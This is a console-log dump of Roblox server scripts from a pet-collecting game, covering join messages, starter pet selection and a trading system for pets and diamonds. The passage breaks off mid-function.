         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

local function sendServerMessage(player)
	local save = _L.Saving.Get(player)
	
	local function send()
		local text = _L.Gamepasses.Owns(player, _L.Directory.Gamepasses.VIP.ID) and "A VIP player has joined the game! Greetings, " .. player.Name .."! 👋" or player.Name .. " has joined! 👋"
		_L.Network.FireAll("Chat Msg", text, Color3.fromRGB(223, 223, 223))
	end
	
	coroutine.wrap(function()
		--- this makes it so welcome message doesnt show twice on a new player joining...
		if save and save["JoinDebug"] then	
			wait(3)
			send()
		end	
	end)()
end

game.Players.PlayerAdded:Connect(sendServerMessage)  -  Editar
  04:54:13.771    -  Editar
  04:54:13.771  ----- [2344] ServerScriptService.Scripts.Game.Starter -----  -  Editar
  04:54:13.772  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
_L.Network.Invoked("Pick Starter").OnInvoke = function(player,pet)
    local save = _L.Saving.Get(player)

    if (not save) then 
        return false, "???"
    end

    if save.PickedStarter == true then
        return false, "already picked"
    end

    local starters = {
        ["cat"] = "1",
        ["dog"] = "2",
        ["bunny"] = "3"
    }

    local selectedPet = nil
    if starters[pet] then
        save.PickedStarter = true
        selectedPet = _L.Pets.Create(player, starters[pet], {s = 1})
        return true, selectedPet		
    end

    return false, "???"
end

  -  Editar
  04:54:13.772    -  Editar
  04:54:13.772  ----- [2345] ServerScriptService.Scripts.Game.TradeRating -----  -  Editar
  04:54:13.772  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Network.Invoked("Rate Trade").OnInvoke = function(plyr, userId, t, rate)
    return false, "Rating does nothing"
end
  -  Editar
  04:54:13.772    -  Editar
  04:54:13.772  ----- [2346] ServerScriptService.Scripts.Game.Trading [OLD] -----  -  Editar
  04:54:13.772  --[[

     THIS WAS ORIGINALLY SCRIPTED BY SMALL GAMES .gg/smallgames  
     join: .gg/psz

--]]

--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local trades = {}

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

local function GetByPlyr(plyr)
	for i,v in pairs(trades) do
		if v.sender == plyr or v.target == plyr then
			return v, tostring(i)
		end
	end
	return
end

_G.GetByPlyr = GetByPlyr

_G.Friends = {}
local function iterPageItems(pages)
	return coroutine.wrap(function()
		local pagenum = 1
		while true do
			for _, item in ipairs(pages:GetCurrentPage()) do
				coroutine.yield(item, pagenum)
			end
			if pages.IsFinished then
				break
			end
			pages:AdvanceToNextPageAsync()
			pagenum = pagenum + 1
		end
	end)
end

_L.Signal.Fired("Player Added"):connect(function(plyr)
	pcall(function()
		local friendPages = game.Players:GetFriendsAsync(plyr.UserId)
		local usernames = {}

		for item, pageNo in iterPageItems(friendPages) do
			table.insert(usernames, item.Id)
		end
		if plyr and plyr.Parent then
			_G.Friends[tostring(plyr.UserId)] = usernames
		end
	end)
end)

game.Players.PlayerRemoving:Connect(function(plyr)
	_G.Friends[tostring(plyr.UserId)] = nil
end)

local WL = {}
for i,v in pairs({ "id", "uid", "idt", "s", "nk", "l", "snk", "hc", "powers", "merchData", "g", "r", "dm", "sh" }) do
	WL[v] = true
end

local TradingTemplate = {
	sender = nil,
	target = nil,
	targetReady = false,
	senderReady = false,
	targetConfirmed = false,
	senderConfirmed = false,
	confirmStage = false,
	processing = false,
	counter = 0,
	lastCounter = 0,
	senderItems = {
		pets = {},
		diamonds = 0,
	},
	targetItems = {
		pets = {},	
		diamonds = 0,
	},
	messages = {},
	confirmTick = 0
}

local Plyr_Info = {}

_L.Signal.Fired("Player Added"):connect(function(plyr)
	Plyr_Info[tostring(plyr.UserId)] = {os.clock(), false}
end)

game.Players.PlayerRemoving:Connect(function(plyr)
	Plyr_Info[tostring(plyr.UserId)] = nil
end)

local function GetTradingTimer(plyr)
	if Plyr_Info[tostring(plyr.UserId)] then
		local f = os.clock() - Plyr_Info[tostring(plyr.UserId)][1]		
		if f >= 60 then
			return true
		else
			return false
			--return tostring(plyr.Name).. " needs wait 20-40 seconds before trading."
		end
	end

	return "No info for other player"
end


------------------------------------------------------------------------------------------------
--[[ PROCESSING NOTES ]]--
-- TODO: WHEN SETTING BOTH READY SET OSACCEPTED AS OS.CLOCK AND START HB LOOP
-- TODO: REMEMBER TO CHECK IF THIS IS *NIL* SPECIFICALLY. FALSE MEANS ITS PROCESSING BUT NOTHING HAS GONE WRONG
------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------
--[[ NOTES ]]--
-- TODO: MAKE SURE PLAYER SENDS THE CORRECT IDS
------------------------------------------------------------------------------------------------

-- target, sender, targetReady, senderReady
local function CheckBro(plyr, IsInit)
	if ((not (plyr and plyr:IsDescendantOf(game.Players) and game.Players:FindFirstChild(plyr.Name))) or (not _L.Saving.Get(plyr))) or not plyr:FindFirstChild("__LOADED") then
		return false
	end
	if GetByPlyr(plyr) and IsInit then
		return false
	end
	return true
end

local function Get(id)
	return trades[tostring(id)]
end

local function GetPartners(id)
	local f = Get(id)
	if not f then
		return
	end
	return f.sender, f.target
end


local function CheckTrade(id)
	local PartnerA, partnerB = GetPartners(id)
	if not (CheckBro(PartnerA) and CheckBro(partnerB)) then
		return
	end
	if not Get(id) then
		return
	end
	return true
end

local function NotifyPartners(id, message, x, f)
	local function send(plyr)
		task.spawn(function()
			pcall(function()
				_L.Network.Fire((x or "Send Message"), plyr, (message == true and true) or tostring(message))
			end)
		end)
	end
	local trade = Get(id)
	if f and f[1] and f[2] then
		send(f[1])
		send(f[2])
	else
		if (not trade) or (not CheckTrade(id)) then
			return false
		end
		send(trade.sender)
		send(trade.target)
	end
	return true
end

local function SendPartners(id, f, THEN_DO, ...)
	local x = {...}
	local function send(plyr)
		pcall(function()
			_L.Network.Fire(f, plyr, unpack(x))
		end)
	end
	local trade = Get(id)
	if (not trade) or (not CheckTrade(id)) then
		return false
	end
	send(trade.sender)
	send(trade.target)
	THEN_DO()
	return true
end

local function ForceStopTrade(id, r)
	if trades[tostring(id)] then
		if r == "/" then
			SendPartners(id, "Trade Processed", function()
				trades[tostring(id)] = nil
			end, "/")
		else
			warn(tostring(r))
			SendPartners(id, "Trade Processed", function()
				trades[tostring(id)] = nil
			end, false)
		end
		trades[tostring(id)] = nil
	end
end

local function Update(id)
	local function send(plyr)
		_L.Network.Fire("Update Trade", plyr, tostring(id), Get(id))
	end
	local trade = Get(id)
	if not trade then
		return false
	end
	if not CheckTrade(id) then
		return false
	end
	send(trade.sender)
	send(trade.target)
	return true
end

local function SafelyUpdate(id)
	if not Update(id) then
		ForceStopTrade(id, "Something went wrong while updating the trade partners")
		return false
	end
	return true
end

local function DeepCopy(original)
	local copy = {}
	for k, v in pairs(original) do
		if type(v) == "table" then
			v = DeepCopy(v)
		end
		copy[k] = v
	end
	return copy
end

local function Initialize(plyr, otherplyr)
	if (not GetByPlyr(plyr)) and (not GetByPlyr(otherplyr)) then
		if not (CheckBro(plyr, true) and CheckBro(otherplyr, true) and plyr.UserId ~= otherplyr.UserId) then
			return
		end
		if not Plyr_Info[tostring(plyr.UserId)] then
			return
		end

		local trade = _L.Functions.CloneTable(TradingTemplate)
		if not( trade and trade.senderItems) then
			return
		end
		local id = _L.Functions.GenerateUID()

		trade.sender = plyr
		trade.target = otherplyr
		trade.id = tostring(id)
		trade["messages"] = {}

		trades[id] = trade

		_L.Network.Fire("Init Trade", plyr, id, trades[id])
		_L.Network.Fire("Init Trade", otherplyr, id, trades[id])


		Plyr_Info[tostring(plyr.UserId)][2] = true
		Plyr_Info[tostring(otherplyr.UserId)][2] = true

		return trades[id], id
	end
end

local function FigureOutOfferString(plyr)
	local trade, id = GetByPlyr(plyr)
	if not trade then
		return
	end
	if trade.sender == plyr then
		return "senderItems"
	end
	if trade.target == plyr then
		return "targetItems"
	end
	return
end

local function FigureOutSenderData(plyr)
	local trade, id = GetByPlyr(plyr)
	if not trade then
		return
	end
	if trade.sender == plyr then
		return "sender"
	end
	if trade.target == plyr then
		return "target"
	end
	return
end

local function FigureSendMessage(plyr)
	local trade, id = GetByPlyr(plyr)
	if not trade then
		return
	end
	if trade.sender == plyr then
		return "messages"
	end
	return
end

-- TODO: HERE.
local function AddPet(plyr, f, petId)
	local s = _L.Saving.Get(plyr)
	if not s then
		return false, "Could not find save for player. This is crucial"
	end
	if not (Plyr_Info[tostring(plyr.UserId)] and Plyr_Info[tostring(plyr.UserId)][2]) then
		return false, "You cant add pets!"
	end
	local pet, oplyr = _L.Pets.Get(tostring(petId))
	if not (pet and tostring(pet.uid) == tostring(petId) and oplyr and oplyr == plyr) then
		return false, "Could not add pet to trade because of failed ownership check"
	end
	local trade, id = GetByPlyr(plyr)
	if tostring(id) ~= f then
		return false, "IDs were not the same"
	end
	if not trade or not id then
		return false, "Could not identify trade"
	end

	if pet.l or pet.l == true then
		return false, "Pet is locked, unlock it first!"
	end

	if pet.s <= 0 and pet.s ~= 0 then
		return false, "Pet has negative power, you cant trade it!"
	end

	local dir = _L.Directory.Pets[tostring(pet.id)]
	if not dir then
		return false, "No directory"
	end
	if not dir.tradeable then
		return false, "This pet is not tradeable"
	end
	local offer = FigureOutOfferString(plyr)
	if not offer then
		return false, "Could not figure out offer string"
	end
	if not trade[offer] then
		return false, "Offer string was invalid"
	end
	if _L.Functions.SearchArray(trade[offer].pets, tostring(pet.uid)) then
		return false, "Pet is already in offer."
	end
	if #trade[offer].pets >= 30 then
		return false, "Your side full"
	end
	table.insert(trade[offer].pets, tostring(pet.uid))
	trade.senderReady = false
	trade.targetReady = false
	trade.targetConfirmed = false
	trade.senderConfirmed = false
	
	-- asf
	trade.confirmStage = false
	
	if not SafelyUpdate(id) then
		return false, "Trade could not safely update"
	end
	
	--[[if trade.counter ~= 0 then -- idk
		if trade.lastCounter == 0 then
			trade.lastCounter = trade.counter --workspace:GetServerTimeNow()
			trade.counter = workspace:GetServerTimeNow()
		else
			trade.lastCounter = workspace:GetServerTimeNow()
			trade.counter = trade.lastCounter
		end	
	else
		trade.counter = workspace:GetServerTimeNow()
	end]]--
	trade.counter = workspace:GetServerTimeNow() + 3
	trade.lastCounter = workspace:GetServerTimeNow() -- idk
	
	return true
end

_L.Network.Invoked("Send Trade Message").OnInvoke = function(plyr, f, Text)
	local s = _L.Saving.Get(plyr)
	local trade, id = GetByPlyr(plyr)
	if tostring(id) ~= f then
		return false, "IDs were not the same"
	end

	if not trade or not id then
		return false, "Could not identify trade"
	end

	if not s then
		return false, "No file"
	end

	if not Text or Text == nil or Text == "" then
		return false, "Please say anything first!"
    end
    
    local filtered
    local success,e = pcall(function()
        filtered = _L.TextService:FilterStringAsync(Text, plyr.UserId)
        filtered = filtered:GetNonChatStringForBroadcastAsync()
    end)

    if not success or not filtered then
        return nil, "Unable to filter your message. Try something else"
    end

	trade.senderReady = false
	trade.targetReady = false
	trade.targetConfirmed = false
	trade.senderConfirmed = false
	
	-- asf
	trade.confirmStage = false

	if plyr == trade.sender then
        table.insert(trade.messages,{isSender = true, message = tostring(filtered)})
	elseif plyr == trade.target then
        table.insert(trade.messages,{isSender = false, message = tostring(filtered)})
	else
		return false, "something went wrong try again later"
	end

	return true
end

_L.Network.Invoked("Change Trade Diamonds").OnInvoke = function(plyr , f, amt)
	local s = _L.Saving.Get(plyr)
	if not s then
		return false, "Could not find save for player. This is crucial"
	end

	if not (Plyr_Info[tostring(plyr.UserId)] and Plyr_Info[tostring(plyr.UserId)][2]) then
		return false, "You cant add pets!"
	end

	local trade, id = GetByPlyr(plyr)
	if tostring(id) ~= f then
		return false, "IDs were not the same"
	end

	if not trade or not id then
		return false, "Could not identify trade"
	end

	local TAmt = tonumber(amt)
	if not TAmt then
		return false
	end

	if TAmt > s.Diamonds then
		return false
	end

	if TAmt < 0 then
		return false
	end

	local offer = FigureOutOfferString(plyr)
	if not (offer and trade[offer]) then
		return false, "Offer string is invalid"
	end
	trade[offer].diamonds = math.round(TAmt)
	trade.senderReady = false
	trade.targetReady = false
	trade.targetConfirmed = false
	trade.senderConfirmed = false
	
	-- asf
	trade.confirmStage = false

	if not SafelyUpdate(id) then
		return false, "Trade could not safely update"
	end
	
	trade.counter = workspace:GetServerTimeNow() + 3
	trade.lastCounter = workspace:GetServerTimeNow() -- idk

	return true
end

_L.Network.Invoked("Add Trade Pet").OnInvoke = AddPet

_L.Network.Invoked("Get Trade").OnInvoke = function(plyr, sesh)
	return trades[tostring(sesh)]
end

local function FigureOutDetails(plyr, f)
	local f = Get(tostring(f))
	if not f then
		return
	end
	if f.target == plyr then
		return nil, f.sender
	else
		return nil, f.target
	end
end

--[[_L.Network.Invoked("Cancel Trade").OnInvoke = function(plyr, sesh)
	local GET, ID = GetByPlyr(plyr)
	if not (GET and ID) then
		return false, "NO GET OR ID"
	end
	if tostring(ID) ~= tostring(sesh) then
		return false, "Invalid session id"
	end
	if not (Plyr_Info[tostring(plyr.UserId)] and Plyr_Info[tostring(plyr.UserId)][2]) then
		return false, "You cant do actions"
	end
	local f, OTHER = FigureOutDetails(plyr, ID)
	SendPartners(ID, "Trade Cancelled", function()
		if not (Plyr_Info[tostring(plyr.UserId)] and Plyr_Info[tostring(plyr.UserId)][2]) then
			return
		end
		ForceStopTrade(ID, "/")
	end, ID, OTHER or {DisplayName = "???"})
	return true
end]]

_L.Network.Invoked("Remove Trade Pet").OnInvoke = function(plyr, id , petId)
	local s = _L.Saving.Get(plyr)
	if not s then
		return false, "Could not find save for player. This is crucial"
	end
	if not (Plyr_Info[tostring(plyr.UserId)] and Plyr_Info[tostring(plyr.UserId)][2]) then
		return false, "You cant change pets!"
	end
	local pet, oplyr = _L.Pets.Get(tostring(petId))
	if not (pet and tostring(pet.uid) == tostring(petId) and oplyr and oplyr == plyr) then
		return false, "Could not add pet to trade because of failed ownership check"
	end
	local trade, id = GetByPlyr(plyr)
	if not trade or not id then
		return false, "Could not identify trade"
	end
	if tostring(id) ~= id then
		return false, "IDs were not the same"
	end
	local offer = FigureOutOfferString(plyr)
	if not offer then
		return false, "Could not figure out offer string"
	end
	if not trade[offer] then
		return false, "Offer string was invalid"
	end
	if not _L.Functions.SearchArray(trade[offer].pets, tostring(petId)) then
		return false, "Pet not in offer."
	end
	local removed
	for v1 = #trade[offer].pets, 1, -1 do
		if trade[offer].pets[v1] == tostring(petId) then
			table.remove(trade[offer].pets, v1)
			removed = true
		end
	end
	trade.senderReady = false
	trade.targetReady = false
	trade.targetConfirmed = false
	trade.senderConfirmed = false
	
	-- asf
	trade.confirmStage = false
	
	if not removed then
		return false, "Failed to remove"
	end
	if not SafelyUpdate(id) then
		return false, "Trade could not safely update"
	end
	return true
end


local function CorrectPetIds(id)
	local trade = Get(id)
	if not (trade and trade.senderItems and trade.targetItems) then
		return
	end
	local f = true
	for i,v in pairs(trade.senderItems.pets) do
		if not _L.Pets.Get(tostring(v)) then
			f = false
			break
		end
	end
	if f then
		for i,v in pairs(trade.targetItems.pets) do
			if not _L.Pets.Get(tostring(v)) then
				f = false
				break
			end
		end
	end
	return f
end

local function ProcessTrade(id)
	local timeStart = os.clock()
	local trade = Get(id)
	if not trade then
		return
	end
	if not CheckTrade(id) then
		ForceStopTrade(id, "PROCESSING: Something went wrong while checking the trade session")
		return
	end
	if not (trade.senderConfirmed and trade.targetConfirmed) then
		return
	end
	if not CorrectPetIds(tostring(id)) then
		ForceStopTrade(id, "PROCESSING: Something went wrong while checking pets")
		return
	end
	local PleaseStopTrade
	local function InitializePlayerStats(plyr)
		local succes, err = pcall(function()
			local s = _L.Saving.Get(plyr)
			if not s then
				PleaseStopTrade = "No statistics for " .. tostring(plyr.Name)
				return
			end
			if (not s.PickedStarter) then
				PleaseStopTrade = "One player has not picked their starter pet yet"
				return
			end
			local offers = FigureOutOfferString(plyr)
			if not offers and tostring(offers) ~= "nil" then
				PleaseStopTrade = "Could not figure out offer string for " .. tostring(plyr.Name)
				return
			end
			if not (s.Diamonds and s.Diamonds >= trade[offers].diamonds) then
				PleaseStopTrade = tostring(plyr.Name) .. " lacks diamonds that were previously available"
				return
			end
			if not Plyr_Info[tostring(plyr.UserId)] then
				PleaseStopTrade = "No player info for one of the two players"
				return
			end
			if not pcall(function() Plyr_Info[tostring(plyr.UserId)][2] = false end) then
				PleaseStopTrade = "Failed to set player info to false"
				return
			end
		end)
		if not succes then
			PleaseStopTrade = "An error occured during a trade: " .. tostring(err)
			return
		end
	end
	if ((not trade.sender) and CheckBro(trade.sender) and trade.target and CheckBro(trade.target)) then
		ForceStopTrade(id, "PROCESSING: Something went wrong while checking trading partners")
		return
	end

	InitializePlayerStats(trade.sender)
	if PleaseStopTrade then
		ForceStopTrade(id, "PROCESSING: " .. tostring(PleaseStopTrade))
		return
	end
	InitializePlayerStats(trade.target)
	if PleaseStopTrade then
		ForceStopTrade(id, "PROCESSING: " .. tostring(PleaseStopTrade))
		return
	end

	-- NOW OFFICIALLY PROCESSING
	trade.isProcess = true
	if not (trade.senderConfirmed and trade.targetConfirmed) then
		return
	end

	-- Give diamonds
	local DiamondsFrame = {-1, -1}
	local function AddToDiamondsFrame(plyr, T)
		local s = _L.Saving.Get(plyr)
		if not s then
			PleaseStopTrade = "No statistics for " .. tostring(plyr.Name)
			return
		end
		local offers = FigureOutOfferString(plyr)
		if not offers and tostring(offers) ~= "nil" then
			PleaseStopTrade = "Could not figure out offer string for " .. tostring(plyr.Name)
			return
		end
		if not (s.Diamonds and s.Diamonds >= trade[offers].diamonds) then
			PleaseStopTrade = tostring(plyr.Name) .. " lacks diamonds that were previously available"
			return
		end
		DiamondsFrame[T] = trade[offers].diamonds
    end
    
	AddToDiamondsFrame(trade.sender, 1)
    AddToDiamondsFrame(trade.target, 2)
    
	if PleaseStopTrade then
		ForceStopTrade(id, "PROCESSING: " .. tostring(PleaseStopTrade))
		return
    end
    
	local C_PETS = {-1, -1}
	local NeedSlots = nil
	local function SayNah(f)
		if not NotifyPartners(id, (f or "One of the players needs more inventory space. (Or needs atleast 1 pet!)")) then
			return
		end
		trade.senderConfirmed = false
		trade.targetConfirmed = false
		trade.senderReady = false
		trade.targetReady = false
		-- asf
		trade.confirmStage = false
		
		trade.processing = false
		trade.isProcess = false
		pcall(function()
			Plyr_Info[tostring(trade.sender.UserId)][2] = true
		end)
		pcall(function()
			Plyr_Info[tostring(trade.target.UserId)][2] = true
		end)
		if not SafelyUpdate(id) then
			return
		end
		return true
	end

	local function ConvertPets(plyr, numb)
		local s = _L.Saving.Get(plyr)
		if not s then
			PleaseStopTrade = "No statistics for " .. tostring(plyr.Name)
			return
		end
		local offers = FigureOutOfferString(plyr)
		if not offers and tostring(offers) ~= "nil" then
			PleaseStopTrade = "Could not figure out offer string for " .. tostring(plyr.Name)
			return
		end
		C_PETS[numb] = {}
		for i,v in pairs(trade[offers].pets) do
